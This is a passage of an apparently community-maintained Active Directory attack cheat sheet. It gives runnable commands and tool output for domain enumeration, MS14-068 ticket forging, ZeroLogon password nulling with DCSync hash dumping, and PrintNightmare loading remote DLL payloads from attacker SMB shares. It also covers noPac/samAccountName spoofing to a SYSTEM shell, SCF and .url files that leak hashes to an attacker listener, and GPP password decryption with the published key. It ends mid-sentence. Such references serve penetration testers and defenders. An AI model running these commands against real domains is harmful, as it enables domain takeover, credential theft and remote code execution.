Get-NetDomain -Domain \u0026lt;DomainName\u0026gt;\nGet Domain SID: Get-DomainSID\nGet Domain Policy:\nGet-DomainPolicy #Will show us the policy configurations of the Domain about system access or kerberos (Get-DomainPolicy).\u0026#34;system access\u0026#34; (Get-DomainPolicy).\u0026#34;kerberos policy\u0026#34; Get Domain Controlers:\nGet-NetDomainController Get-NetDomainController -Domain \u0026lt;DomainName\u0026gt; Enumerate Domain Users:\nGet-NetUser Get-NetUser -SamAccountName \u0026lt;user\u0026gt; Get-NetUser | select cn Get-UserProperty #Check last password change Get-UserProperty -Properties pwdlastset #Get a spesific \u0026#34;string\u0026#34; on a user\u0026#39;s attribute Find-UserField -SearchField Description -SearchTerm \u0026#34;wtver\u0026#34; #Enumerate user logged on a machine Get-NetLoggedon -ComputerName \u0026lt;ComputerName\u0026gt; #Enumerate Session Information for a machine Get-NetSession -ComputerName \u0026lt;ComputerName\u0026gt; #Enumerate domain machines of the current/specified domain where specific users are logged into Find-DomainUserLocation -Domain \u0026lt;DomainName\u0026gt; | Select-Object UserName, SessionFromName Enum Domain Computers:\nGet-NetComputer -FullData Get-DomainGroup #Enumerate Live machines Get-NetComputer -Ping Enum Groups and Group Members:\nGet-NetGroupMember -GroupName \u0026#34;\u0026lt;GroupName\u0026gt;\u0026#34; -Domain \u0026lt;DomainName\u0026gt; #Enumerate the members of a specified group of the domain Get-DomainGroup -Identity \u0026lt;GroupName\u0026gt; | Select-Object -ExpandProperty Member #Returns all GPOs in a domain that modify local group memberships through Restricted Groups or Group Policy Preferences Get-DomainGPOLocalGroup | Select-Object GPODisplayName, GroupName Enumerate Shares\n#Enumerate Domain Shares Find-DomainShare #Enumerate Domain Shares the current user has access Find-DomainShare -CheckShareAccess Enum Group Policies:\nGet-NetGPO # Shows active Policy on specified machine Get-NetGPO -ComputerName \u0026lt;Name of the PC\u0026gt; Get-NetGPOGroup #Get users that are part of a Machine\u0026#39;s local Admin group Find-GPOComputerAdmin -ComputerName \u0026lt;ComputerName\u0026gt; Enum OUs:\nGet-NetOU -FullData Get-NetGPO -GPOname \u0026lt;The GUID of the GPO\u0026gt; Enum ACLs:\n# Returns the ACLs associated with the specified account Get-ObjectAcl -SamAccountName \u0026lt;AccountName\u0026gt; -ResolveGUIDs Get-ObjectAcl -ADSprefix \u0026#39;CN=Administrator, CN=Users\u0026#39; -Verbose #Search for interesting ACEs Invoke-ACLScanner -ResolveGUIDs #Check the ACLs associated with a specified path (e.g smb share) Get-PathAcl -Path \u0026#34;\\\\Path\\Of\\A\\Share\u0026#34; Enum Domain Trust:\nGet-NetDomainTrust Get-NetDomainTrust -Domain \u0026lt;DomainName\u0026gt; Enum Forest Trust:\nGet-NetForestDomain Get-NetForestDomain Forest \u0026lt;ForestName\u0026gt; #Domains of Forest Enumeration Get-NetForestDomain Get-NetForestDomain Forest \u0026lt;ForestName\u0026gt; #Map the Trust of the Forest Get-NetForestTrust Get-NetDomainTrust -Forest \u0026lt;ForestName\u0026gt; User Hunting:\n#Finds all machines on the current domain where the current user has local admin access Find-LocalAdminAccess -Verbose #Find local admins on all machines of the domain: Invoke-EnumerateLocalAdmin -Verbose #Find computers were a Domain Admin OR a specified user has a session Invoke-UserHunter Invoke-UserHunter -GroupName \u0026#34;RDPUsers\u0026#34; Invoke-UserHunter -Stealth #Confirming admin access: Invoke-UserHunter -CheckAccess :heavy_exclamation_mark: Priv Esc to Domain Admin with User Hunting: I have local admin access on a machine -\u0026gt; A Domain Admin has a session on that machine -\u0026gt; I steal his token and impersonate him -\u0026gt;\nProfit!\nPowerView 3.0 Tricks\nUsing AD Module # Get Current Domain: Get-ADDomain\nEnum Other Domains: Get-ADDomain -Identity \u0026lt;Domain\u0026gt;\nGet Domain SID: Get-DomainSID\nGet Domain Controlers:\nGet-ADDomainController Get-ADDomainController -Identity \u0026lt;DomainName\u0026gt; Enumerate Domain Users:\nGet-ADUser -Filter * -Identity \u0026lt;user\u0026gt; -Properties * #Get a spesific \u0026#34;string\u0026#34; on a user\u0026#39;s attribute Get-ADUser -Filter \u0026#39;Description -like \u0026#34;*wtver*\u0026#34;\u0026#39; -Properties Description | select Name, Description Enum Domain Computers:\nGet-ADComputer -Filter * -Properties * Get-ADGroup -Filter * Enum Domain Trust:\nGet-ADTrust -Filter * Get-ADTrust -Identity \u0026lt;DomainName\u0026gt; Enum Forest Trust:\nGet-ADForest Get-ADForest -Identity \u0026lt;ForestName\u0026gt; #Domains of Forest Enumeration (Get-ADForest).Domains Enum Local AppLocker Effective Policy:\nGet-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections Other Interesting Commands # Find Domain Controllers nslookup domain.com nslookup -type=srv _ldap._tcp.dc._msdcs.\u0026lt;domain\u0026gt;.com nltest /dclist:domain.com Get-ADDomainController -filter * | Select-Object name gpresult /r $Env:LOGONSERVER echo %LOGONSERVER% Most common paths to AD compromise # MS14-068 (Microsoft Kerberos Checksum Validation Vulnerability) # This exploit require to know the user SID, you can use rpcclient to remotely get it or wmi if you have an access on the machine.\n# remote rpcclient $\u0026gt; lookupnames john.smith john.smith S-1-5-21-2923581646-3335815371-2872905324-1107 (User: 1) # loc wmic useraccount get name,sid Administrator S-1-5-21-3415849876-833628785-5197346142-500 Guest S-1-5-21-3415849876-833628785-5197346142-501 Administrator S-1-5-21-297520375-2634728305-5197346142-500 Guest S-1-5-21-297520375-2634728305-5197346142-501 krbtgt S-1-5-21-297520375-2634728305-5197346142-502 lambda S-1-5-21-297520375-2634728305-5197346142-1110 # powerview Convert-NameToSid high-sec-corp.localkrbtgt S-1-5-21-2941561648-383941485-1389968811-502 Doc: https://github.com/gentilkiwi/kekeo/wiki/ms14068 Generate a ticket with metasploit or pykek\nMetasploit: auxiliary/admin/kerberos/ms14_068_kerberos_checksum Name Current Setting Required Description ---- --------------- -------- ----------- DOMAIN LABDOMAIN.LOCAL yes The Domain (upper case) Ex: DEMO.LOCAL PASSWORD P@ssw0rd yes The Domain User password RHOSTS 10.10.10.10 yes The target address range or CIDR identifier RPORT 88 yes The target port Timeout 10 yes The TCP timeout to establish connection and read data USER lambda yes The Domain User USER_SID S-1-5-21-297520375-2634728305-5197346142-1106 yes The Domain User SID, Ex: S-1-5-21-1755879683-3641577184-3486455962-1000 # Alternative download: https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek $ git clone https://github.com/SecWiki/windows-kernel-exploits $ python ./ms14-068.py -u \u0026lt;userName\u0026gt;@\u0026lt;domainName\u0026gt; -s \u0026lt;userSid\u0026gt; -d \u0026lt;domainControlerAddr\u0026gt; -p \u0026lt;clearPassword\u0026gt; $ python ./ms14-068.py -u darthsidious@lab.adsecurity.org -p TheEmperor99! -s S-1-5-21-1473643419-774954089-2222329127-1110 -d adsdc02.lab.adsecurity.org $ python ./ms14-068.py -u john.smith@pwn3d.local -s S-1-5-21-2923581646-3335815371-2872905324-1107 -d 192.168.115.10 $ python ms14-068.py -u user01@metasploitable.local -d msfdc01.metasploitable.local -p Password1 -s S-1-5-21-2928836948-3642677517-2073454066 -1105 [+] Building AS-REQ for msfdc01.metasploitable.local... Done! [+] Sending AS-REQ to msfdc01.metasploitable.local... Done! [+] Receiving AS-REP from msfdc01.metasploitable.local... Done! [+] Parsing AS-REP from msfdc01.metasploitable.local... Done! [+] Building TGS-REQ for msfdc01.metasploitable.local... Done! [+] Sending TGS-REQ to msfdc01.metasploitable.local... Done! [+] Receiving TGS-REP from msfdc01.metasploitable.local... Done! [+] Parsing TGS-REP from msfdc01.metasploitable.local... Done! [+] Creating ccache file \u0026#39;TGT_user01@metasploitable.local.ccache\u0026#39;... Done! Then use mimikatz to load the ticket.\nmimikatz.exe \u0026#34;kerberos::ptc c:\\temp\\TGT_darthsidious@lab.adsecurity.org.ccache\u0026#34; :warning: If the clock is skewed use clock-skew.nse script from nmap\nLinux\u0026gt; $ nmap -sV -sC 10.10.10.10 clock-skew: mean: -1998d09h03m04s, deviation: 4h00m00s, median: -1998d11h03m05s Linux\u0026gt; sudo date -s \u0026#34;14 APR 2015 18:25:16\u0026#34; Windows\u0026gt; net time /domain /set Mitigations # Ensure the DCPromo process includes a patch QA step before running DCPromo that checks for installation of KB3011780. The quick and easy way to perform this check is with PowerShell: get-hotfix 3011780 From CVE to SYSTEM shell on DC # Sometimes you will find a Domain Controller without the latest patches installed, use the newest CVE to gain a SYSTEM shell on it. If you have a \u0026ldquo;normal user\u0026rdquo; shell on the DC you can also try to elevate your privileges using one of the methods listed in Windows - Privilege Escalation\nZeroLogon # CVE-2020-1472\nWhite Paper from Secura : https://www.secura.com/pathtoimg.php?id=2055\nExploit steps from the white paper\nSpoofing the client credential Disabling signing and sealing Spoofing a call Changing a computer\u0026rsquo;s AD password to null From password change to domain admin :warning: reset the computer\u0026rsquo;s AD password in a proper way to avoid any Deny of Service cve-2020-1472-exploit.py - Python script from dirkjanm\n# Check (https://github.com/SecuraBV/CVE-2020-1472) proxychains python3 zerologon_tester.py DC01 172.16.1.5 $ git clone https://github.com/dirkjanm/CVE-2020-1472.git # Activate a virtual env to install impacket $ python3 -m venv venv $ source venv/bin/activate $ pip3 install . # Exploit the CVE (https://github.com/dirkjanm/CVE-2020-1472/blob/master/cve-2020-1472-exploit.py) proxychains python3 cve-2020-1472-exploit.py DC01 172.16.1.5 # Find the old NT hash of the DC proxychains secretsdump.py -history -just-dc-user \u0026#39;DC01$\u0026#39; -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 \u0026#39;CORP/DC01$@DC01.CORP.LOCAL\u0026#39; # Restore password from secretsdump # secretsdump will automatically dump the plaintext machine password (hex encoded) # when dumping the local registry secrets on the newest version python restorepassword.py CORP/DC01@DC01.CORP.LOCAL -target-ip 172.16.1.5 -hexpass e6ad4c4f64e71cf8c8020aa44bbd70ee711b8dce2adecd7e0d7fd1d76d70a848c987450c5be97b230bd144f3c3 deactivate nccfsas - .NET binary for Cobalt Strike\u0026rsquo;s execute-assembly\ngit clone https://github.com/nccgroup/nccfsas # Check execute-assembly SharpZeroLogon.exe win-dc01.vulncorp.local # Resetting the machine account password execute-assembly SharpZeroLogon.exe win-dc01.vulncorp.local -reset # Testing from a non Domain-joined machine execute-assembly SharpZeroLogon.exe win-dc01.vulncorp.local -patch # Now reset the password back Mimikatz - 2.2.0 20200917 Post-Zerologon\nprivilege::debug # Check for the CVE lsadump::zerologon /target:DC01.LAB.LOCAL /account:DC01$ # Exploit the CVE and set the computer account\u0026#39;s password to \u0026#34;\u0026#34; lsadump::zerologon /target:DC01.LAB.LOCAL /account:DC01$ /exploit # Execute dcsync to extract some hashes lsadump::dcsync /domain:LAB.LOCAL /dc:DC01.LAB.LOCAL /user:krbtgt /authuser:DC01$ /authdomain:LAB /authpassword:\u0026#34;\u0026#34; /authntlm lsadump::dcsync /domain:LAB.LOCAL /dc:DC01.LAB.LOCAL /user:Administrator /authuser:DC01$ /authdomain:LAB /authpassword:\u0026#34;\u0026#34; /authntlm # Pass The Hash with the extracted Domain Admin hash sekurlsa::pth /user:Administrator /domain:LAB /rc4:HASH_NTLM_ADMIN # Use IP address instead of FQDN to force NTLM with Windows APIs # Reset password to Waza1234/Waza1234/Waza1234/ # https://github.com/gentilkiwi/mimikatz/blob/6191b5a8ea40bbd856942cbc1e48a86c3c505dd3/mimikatz/modules/kuhl_m_lsadump.c#L2584 lsadump::postzerologon /target:10.10.10.10 /account:DC01$ CrackMapExec - only check\ncrackmapexec smb 10.10.10.10 -u username -p password -d domain -M zerologon PrintNightmare # CVE-2021-1675 / CVE-2021-34527\nThe DLL will be stored in C:\\Windows\\System32\\spool\\drivers\\x64\\3\\. The exploit will execute the DLL either from the local filesystem or a remote share.\nRequirements:\nSpooler Service enabled (Mandatory) Server with patches \u0026lt; June 2021 DC with Pre Windows 2000 Compatibility group Server with registry key HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows NT\\Printers\\PointAndPrint\\NoWarningNoElevationOnInstall = (DWORD) 1 Server with registry key HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUA = (DWORD) 0 Detect the vulnerability:\nImpacket - rpcdump python3 ./rpcdump.py @10.0.2.10 | egrep \u0026#39;MS-RPRN|MS-PAR\u0026#39; Protocol: [MS-RPRN]: Print System Remote Protocol It Was All A Dream git clone https://github.com/byt3bl33d3r/ItWasAllADream cd ItWasAllADream \u0026amp;\u0026amp; poetry install \u0026amp;\u0026amp; poetry shell itwasalladream -u user -p Password123 -d domain 10.10.10.10/24 docker run -it itwasalladream -u username -p Password123 -d domain 10.10.10.10 Trigger the exploit:\nNOTE: The payload can be hosted on Impacket SMB server since PR #1109: python3 ./smbserver.py share /tmp/smb/ or using Invoke-BuildAnonymousSMBServer : Import-Module .\\Invoke-BuildAnonymousSMBServer.ps1; Invoke-BuildAnonymousSMBServer -Path C:\\Share -Mode Enable\nSharpNightmare # require a modified Impacket: https://github.com/cube0x0/impacket python3 ./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 \u0026#39;\\\\192.168.1.215\\smb\\addCube.dll\u0026#39; python3 ./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 \u0026#39;C:\\addCube.dll\u0026#39; ## LPE SharpPrintNightmare.exe C:\\addCube.dll ## RCE using existing context SharpPrintNightmare.exe \u0026#39;\\\\192.168.1.215\\smb\\addCube.dll\u0026#39; \u0026#39;C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_addb31f9bff9e936\\Amd64\\UNIDRV.DLL\u0026#39; \u0026#39;\\\\192.168.1.20\u0026#39; ## RCE using runas /netonly SharpPrintNightmare.exe \u0026#39;\\\\192.168.1.215\\smb\\addCube.dll\u0026#39; \u0026#39;C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_83aa9aebf5dffc96\\Amd64\\UNIDRV.DLL\u0026#39; \u0026#39;\\\\192.168.1.10\u0026#39; hackit.local domain_user Pass123 Invoke-Nightmare ## LPE only (PS1 + DLL) Import-Module .\\cve-2021-1675.ps1 Invoke-Nightmare # add user `adm1n`/`P@ssw0rd` in the local admin group by default Invoke-Nightmare -DriverName \u0026#34;Dementor\u0026#34; -NewUser \u0026#34;d3m3nt0r\u0026#34; -NewPassword \u0026#34;AzkabanUnleashed123*\u0026#34; Invoke-Nightmare -DLL \u0026#34;C:\\absolute\\path\\to\\your\\bindshell.dll\u0026#34; Mimikatz v2.2.0-20210709+ ## LPE misc::printnightmare /server:DC01 /library:C:\\Users\\user1\\Documents\\mimispool.dll ## RCE misc::printnightmare /server:CASTLE /library:\\\\10.0.2.12\\smb\\beacon.dll /authdomain:LAB /authuser:Username /authpassword:Password01 /try:50 PrintNightmare - @outflanknl PrintNightmare [target ip or hostname] [UNC path to payload Dll] [optional domain] [optional username] [optional password] Debug informations\nError Message Debug 0x5 rpc_s_access_denied Permissions on the file in the SMB share 0x525 ERROR_NO_SUCH_USER The specified account does not exist. 0x180 unknown error code Share is not SMB2 samAccountName spoofing # During S4U2Self, the KDC will try to append a \u0026lsquo;$\u0026rsquo; to the computer name specified in the TGT, if the computer name is not found. An attacker can create a new machine account with the sAMAccountName set to a domain controller\u0026rsquo;s sAMAccountName - without the \u0026lsquo;$\u0026rsquo;. For instance, suppose there is a domain controller with a sAMAccountName set to \u0026lsquo;DC$\u0026rsquo;. An attacker would then create a machine account with the sAMAccountName set to \u0026lsquo;DC\u0026rsquo;. The attacker can then request a TGT for the newly created machine account. After the TGT has been issued by the KDC, the attacker can rename the newly created machine account to something different, e.g. JOHNS-PC. The attacker can then perform S4U2Self and request a ST to itself as any user. Since the machine account with the sAMAccountName set to \u0026lsquo;DC\u0026rsquo; has been renamed, the KDC will try to find the machine account by appending a \u0026lsquo;$\u0026rsquo;, which will then match the domain controller. The KDC will then issue a valid ST for the domain controller.\nRequirements\nMachineAccountQuota \u0026gt; 0 Check for exploitation\nCheck the MachineAccountQuota of the account crackmapexec ldap 10.10.10.10 -u username -p \u0026#39;Password123\u0026#39; -d \u0026#39;domain.local\u0026#39; --kdcHost 10.10.10.10 -M MAQ StandIn.exe --object ms-DS-MachineAccountQuota=* Check if the DC is vulnerable crackmapexec smb 10.10.10.10 -u \u0026#39;\u0026#39; -p \u0026#39;\u0026#39; -d domain -M nopac Exploitation\nCreate a computer account impacket@linux\u0026gt; addcomputer.py -computer-name \u0026#39;ControlledComputer$\u0026#39; -computer-pass \u0026#39;ComputerPassword\u0026#39; -dc-host DC01 -domain-netbios domain \u0026#39;domain.local/user1:complexpassword\u0026#39; powermad@windows\u0026gt; . .\\Powermad.ps1 powermad@windows\u0026gt; $password = ConvertTo-SecureString \u0026#39;ComputerPassword\u0026#39; -AsPlainText -Force powermad@windows\u0026gt; New-MachineAccount -MachineAccount \u0026#34;ControlledComputer\u0026#34; -Password $($password) -Domain \u0026#34;domain.local\u0026#34; -DomainController \u0026#34;DomainController.domain.local\u0026#34; -Verbose sharpmad@windows\u0026gt; Sharpmad.exe MAQ -Action new -MachineAccount ControlledComputer -MachinePassword ComputerPassword Clear the controlled machine account servicePrincipalName attribute impacket@linux\u0026gt; addspn.py -u \u0026#39;domain\\user\u0026#39; -p \u0026#39;password\u0026#39; -t \u0026#39;ControlledComputer$\u0026#39; -c DomainController powershell@windows\u0026gt; . .\\Powerview.ps1 powershell@windows\u0026gt; Set-DomainObject \u0026#34;CN=ControlledComputer,CN=Computers,DC=domain,DC=local\u0026#34; -Clear \u0026#39;serviceprincipalname\u0026#39; -Verbose (CVE-2021-42278) Change the controlled machine account sAMAccountName to a Domain Controller\u0026rsquo;s name without the trailing $ # https://github.com/SecureAuthCorp/impacket/pull/1224 impacket@linux\u0026gt; renameMachine.py -current-name \u0026#39;ControlledComputer$\u0026#39; -new-name \u0026#39;DomainController\u0026#39; -dc-ip \u0026#39;DomainController.domain.local\u0026#39; \u0026#39;domain.local\u0026#39;/\u0026#39;user\u0026#39;:\u0026#39;password\u0026#39; powermad@windows\u0026gt; Set-MachineAccountAttribute -MachineAccount \u0026#34;ControlledComputer\u0026#34; -Value \u0026#34;DomainController\u0026#34; -Attribute samaccountname -Verbose Request a TGT for the controlled machine account impacket@linux\u0026gt; getTGT.py -dc-ip \u0026#39;DomainController.domain.local\u0026#39; \u0026#39;domain.local\u0026#39;/\u0026#39;DomainController\u0026#39;:\u0026#39;ComputerPassword\u0026#39; cmd@windows\u0026gt; Rubeus.exe asktgt /user:\u0026#34;DomainController\u0026#34; /password:\u0026#34;ComputerPassword\u0026#34; /domain:\u0026#34;domain.local\u0026#34; /dc:\u0026#34;DomainController.domain.local\u0026#34; /nowrap Reset the controlled machine account sAMAccountName to its old value impacket@linux\u0026gt; renameMachine.py -current-name \u0026#39;DomainController\u0026#39; -new-name \u0026#39;ControlledComputer$\u0026#39; \u0026#39;domain.local\u0026#39;/\u0026#39;user\u0026#39;:\u0026#39;password\u0026#39; powermad@windows\u0026gt; Set-MachineAccountAttribute -MachineAccount \u0026#34;ControlledComputer\u0026#34; -Value \u0026#34;ControlledComputer\u0026#34; -Attribute samaccountname -Verbose (CVE-2021-42287) Request a service ticket with S4U2self by presenting the TGT obtained before # https://github.com/SecureAuthCorp/impacket/pull/1202 impacket@linux\u0026gt; KRB5CCNAME=\u0026#39;DomainController.ccache\u0026#39; getST.py -self -impersonate \u0026#39;DomainAdmin\u0026#39; -spn \u0026#39;cifs/DomainController.domain.local\u0026#39; -k -no-pass -dc-ip \u0026#39;DomainController.domain.local\u0026#39; \u0026#39;domain.local\u0026#39;/\u0026#39;DomainController\u0026#39; cmd@windows\u0026gt; Rubeus.exe s4u /self /impersonateuser:\u0026#34;DomainAdmin\u0026#34; /altservice:\u0026#34;ldap/DomainController.domain.local\u0026#34; /dc:\u0026#34;DomainController.domain.local\u0026#34; /ptt /ticket:[Base64 TGT] DCSync: KRB5CCNAME='DomainAdmin.ccache' secretsdump.py -just-dc-user 'krbtgt' -k -no-pass -dc-ip 'DomainController.domain.local' @'DomainController.domain.local' Automated exploitation:\nnoPac - @cube0x0 noPac.exe scan -domain htb.local -user user -pass \u0026#39;password123\u0026#39; noPac.exe -domain htb.local -user domain_user -pass \u0026#39;Password123!\u0026#39; /dc dc.htb.local /mAccount demo123 /mPassword Password123! /service cifs /ptt noPac.exe -domain htb.local -user domain_user -pass \u0026#34;Password123!\u0026#34; /dc dc.htb.local /mAccount demo123 /mPassword Password123! /service ldaps /ptt /impersonate Administrator sam_the_admin - @WazeHell $ python3 sam_the_admin.py \u0026#34;caltech/alice.cassie:Lee@tPass\u0026#34; -dc-ip 192.168.1.110 -shell [*] Selected Target dc.caltech.white [*] Total Domain Admins 11 [*] will try to impersonat gaylene.dreddy [*] Current ms-DS-MachineAccountQuota = 10 [*] Adding Computer Account \u0026#34;SAMTHEADMIN-11$\u0026#34; [*] MachineAccount \u0026#34;SAMTHEADMIN-11$\u0026#34; password = EhFMT%mzmACL [*] Successfully added machine account SAMTHEADMIN-11$ with password EhFMT%mzmACL. [*] SAMTHEADMIN-11$ object = CN=SAMTHEADMIN-11,CN=Computers,DC=caltech,DC=white [*] SAMTHEADMIN-11$ sAMAccountName == dc [*] Saving ticket in dc.ccache [*] Resting the machine account to SAMTHEADMIN-11$ [*] Restored SAMTHEADMIN-11$ sAMAccountName to original value [*] Using TGT from cache [*] Impersonating gaylene.dreddy [*] Requesting S4U2self [*] Saving ticket in gaylene.dreddy.ccache [!] Launching semi-interactive shell - Careful what you execute C:\\Windows\\system32\u0026gt;whoami nt authority\\system Pachine - @ly4k usage: pachine.py [-h] [-scan] [-spn SPN] [-impersonate IMPERSONATE] [-domain-netbios NETBIOSNAME] [-computer-name NEW-COMPUTER-NAME$] [-computer-pass password] [-debug] [-method {SAMR,LDAPS}] [-port {139,445,636}] [-baseDN DC=test,DC=local] [-computer-group CN=Computers,DC=test,DC=local] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] -dc-host hostname [-dc-ip ip] [domain/]username[:password] $ python3 pachine.py -dc-host dc.predator.local -scan \u0026#39;predator.local/john:Passw0rd!\u0026#39; $ python3 pachine.py -dc-host dc.predator.local -spn cifs/dc.predator.local -impersonate administrator \u0026#39;predator.local/john:Passw0rd!\u0026#39; $ export KRB5CCNAME=$PWD/administrator@predator.local.ccache $ impacket-psexec -k -no-pass \u0026#39;predator.local/administrator@dc.predator.local\u0026#39; Mitigations:\nKB5007247 - Windows Server 2012 R2 KB5008601 - Windows Server 2016 KB5008602 - Windows Server 2019 KB5007205 - Windows Server 2022 KB5008102 KB5008380 Open Shares # Some shares can be accessible without authentication, explore them to find some juicy files\nsmbmap\nsmbmap -H 10.10.10.10 # null session smbmap -H 10.10.10.10 -R # recursive listing smbmap -H 10.10.10.10 -u invaliduser # guest smb session smbmap -H 10.10.10.10 -d \u0026#34;DOMAIN.LOCAL\u0026#34; -u \u0026#34;USERNAME\u0026#34; -p \u0026#34;Password123*\u0026#34; pth-smbclient from path-toolkit\npth-smbclient -U \u0026#34;AD/ADMINISTRATOR%aad3b435b51404eeaad3b435b51404ee:2[...]A\u0026#34; //192.168.10.100/Share pth-smbclient -U \u0026#34;AD/ADMINISTRATOR%aad3b435b51404eeaad3b435b51404ee:2[...]A\u0026#34; //192.168.10.100/C$ ls # list files cd # move inside a folder get # download files put # replace a file smbclient from Impacket\nsmbclient -I 10.10.10.100 -L ACTIVE -N -U \u0026#34;\u0026#34; Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC NETLOGON Disk Logon server share Replication Disk SYSVOL Disk Logon server share Users Disk use Sharename # select a Sharename cd Folder # move inside a folder ls # list files smbclient - from Samba, ftp-like client to access SMB/CIFS resources on servers\nsmbclient -U username //10.0.0.1/SYSVOL smbclient //10.0.0.1/Share # Download a folder recursively smb: \\\u0026gt; mask \u0026#34;\u0026#34; smb: \\\u0026gt; recurse ON smb: \\\u0026gt; prompt OFF smb: \\\u0026gt; lcd \u0026#39;/path/to/go/\u0026#39; smb: \\\u0026gt; mget * SCF and URL file attack against writeable share # Theses attacks can be automated with Farmer.exe and Crop.exe\n# Farmer to receive auth farmer.exe \u0026lt;port\u0026gt; [seconds] [output] farmer.exe 8888 0 c:\\windows\\temp\\test.tmp # undefinitely farmer.exe 8888 60 # one minute # Crop can be used to create various file types that will trigger SMB/WebDAV connections for poisoning file shares during hash collection attacks crop.exe \u0026lt;output folder\u0026gt; \u0026lt;output filename\u0026gt; \u0026lt;WebDAV server\u0026gt; \u0026lt;LNK value\u0026gt; [options] Crop.exe \\\\\\\\fileserver\\\\common mdsec.url \\\\\\\\workstation@8888\\\\mdsec.ico Crop.exe \\\\\\\\fileserver\\\\common mdsec.library-ms \\\\\\\\workstation@8888\\\\mdsec SCF Files # Drop the following @something.scf file inside a share and start listening with Responder : responder -wrf --lm -v -I eth0\n[Shell] Command=2 IconFile=\\\\10.10.10.10\\Share\\test.ico [Taskbar] Command=ToggleDesktop Using crackmapexec:\ncrackmapexec smb 10.10.10.10 -u username -p password -M scuffy -o NAME=WORK SERVER=IP_RESPONDER #scf crackmapexec smb 10.10.10.10 -u username -p password -M slinky -o NAME=WORK SERVER=IP_RESPONDER #lnk crackmapexec smb 10.10.10.10 -u username -p password -M slinky -o NAME=WORK SERVER=IP_RESPONDER CLEANUP URL Files # This attack also works with .url files and responder -I eth0 -v.\n[InternetShortcut] URL=whatever WorkingDirectory=whatever IconFile=\\\\10.10.10.10\\%USERNAME%.icon IconIndex=1 Windows Library Files # Windows Library Files (.library-ms)\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;libraryDescription xmlns=\u0026#34;\u0026lt;http://schemas.microsoft.com/windows/2009/library\u0026gt;\u0026#34;\u0026gt; \u0026lt;name\u0026gt;@windows.storage.dll,-34582\u0026lt;/name\u0026gt; \u0026lt;version\u0026gt;6\u0026lt;/version\u0026gt; \u0026lt;isLibraryPinned\u0026gt;true\u0026lt;/isLibraryPinned\u0026gt; \u0026lt;iconReference\u0026gt;imageres.dll,-1003\u0026lt;/iconReference\u0026gt; \u0026lt;templateInfo\u0026gt; \u0026lt;folderType\u0026gt;{7d49d726-3c21-4f05-99aa-fdc2c9474656}\u0026lt;/folderType\u0026gt; \u0026lt;/templateInfo\u0026gt; \u0026lt;searchConnectorDescriptionList\u0026gt; \u0026lt;searchConnectorDescription\u0026gt; \u0026lt;isDefaultSaveLocation\u0026gt;true\u0026lt;/isDefaultSaveLocation\u0026gt; \u0026lt;isSupported\u0026gt;false\u0026lt;/isSupported\u0026gt; \u0026lt;simpleLocation\u0026gt; \u0026lt;url\u0026gt;\\\\\\\\workstation@8888\\\\folder\u0026lt;/url\u0026gt; \u0026lt;/simpleLocation\u0026gt; \u0026lt;/searchConnectorDescription\u0026gt; \u0026lt;/searchConnectorDescriptionList\u0026gt; \u0026lt;/libraryDescription\u0026gt; Windows Search Connectors Files # Windows Search Connectors (.searchConnector-ms)\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;searchConnectorDescription xmlns=\u0026#34;\u0026lt;http://schemas.microsoft.com/windows/2009/searchConnector\u0026gt;\u0026#34;\u0026gt; \u0026lt;iconReference\u0026gt;imageres.dll,-1002\u0026lt;/iconReference\u0026gt; \u0026lt;description\u0026gt;Microsoft Outlook\u0026lt;/description\u0026gt; \u0026lt;isSearchOnlyItem\u0026gt;false\u0026lt;/isSearchOnlyItem\u0026gt; \u0026lt;includeInStartMenuScope\u0026gt;true\u0026lt;/includeInStartMenuScope\u0026gt; \u0026lt;iconReference\u0026gt;\\\\\\\\workstation@8888\\\\folder.ico\u0026lt;/iconReference\u0026gt; \u0026lt;templateInfo\u0026gt; \u0026lt;folderType\u0026gt;{91475FE5-586B-4EBA-8D75-D17434B8CDF6}\u0026lt;/folderType\u0026gt; \u0026lt;/templateInfo\u0026gt; \u0026lt;simpleLocation\u0026gt; \u0026lt;url\u0026gt;\\\\\\\\workstation@8888\\\\folder\u0026lt;/url\u0026gt; \u0026lt;/simpleLocation\u0026gt; \u0026lt;/searchConnectorDescription\u0026gt; Passwords in SYSVOL \u0026amp; Group Policy Preferences # Find password in SYSVOL (MS14-025). SYSVOL is the domain-wide share in Active Directory to which all authenticated users have read access. All domain Group Policies are stored here: \\\\\u0026lt;DOMAIN\u0026gt;\\SYSVOL\\\u0026lt;DOMAIN\u0026gt;\\Policies\\.\nfindstr /S /I cpassword \\\\\u0026lt;FQDN\u0026gt;\\sysvol\\\u0026lt;FQDN\u0026gt;\\policies\\*.xml Decrypt a Group Policy Password found in SYSVOL (by 0x00C651E0), using the 32-byte AES key provided by Microsoft in the MSDN - 2.2.1.1.4 Password Encryption\necho \u0026#39;password_in_base64\u0026#39; | base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 0000000000000000 e.g: echo \u0026#39;5OPdEKwZSf7dYAvLOe6RzRDtcvT/wCP8g5RqmAgjSso=\u0026#39; | base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 0000000000000000 echo \u0026#39;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ\u0026#39; | base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 0000000000000000 Automate the SYSVOL and passwords research # Metasploit modules to enumerate shares and 